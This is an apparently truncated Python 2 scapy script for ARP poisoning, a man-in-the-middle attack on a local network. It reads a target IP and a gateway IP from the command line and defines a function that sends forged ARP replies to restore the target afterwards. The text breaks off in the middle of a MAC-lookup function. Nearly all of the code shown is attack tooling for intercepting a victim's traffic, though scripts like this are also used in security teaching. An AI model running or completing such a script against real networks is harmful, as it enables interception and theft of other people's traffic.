from scapy.all import *
import sys
import os
import threading
target_ip=sys.argv[1]
gateway_ip=sys.argv[2]
interface="wlan0"
packet_count=10000
posining=True

def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
    print"Restoring Target"
    send(ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    send(ARP(op=2,psrc=target_ip,pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)

def get_mac(ip_address):
    response,unanswered=srp